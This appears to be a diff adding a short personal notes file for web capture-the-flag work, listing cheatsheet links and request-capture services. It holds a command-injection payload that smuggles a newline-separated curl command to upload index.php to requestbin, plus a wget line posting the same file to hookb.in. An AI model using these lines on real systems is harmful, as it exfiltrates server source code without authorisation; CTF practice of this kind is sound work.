@@ -1,0 +1,11 @@
+### utils ###
+## links
+https://github.com/w181496/Web-CTF-Cheatsheet
+https://github.com/sl4x0/Web-CTF-Cheatsheet
+
+
+## to catch request
+http://requestbin.net
+payload = "127.0.0.1\ncurl -X POST -F file=@index.php http://requestbin.net/r/tgmtqitg"
+https://hookbin.com/
+wget --post-file index.php https://hookb.in/xxxxxx
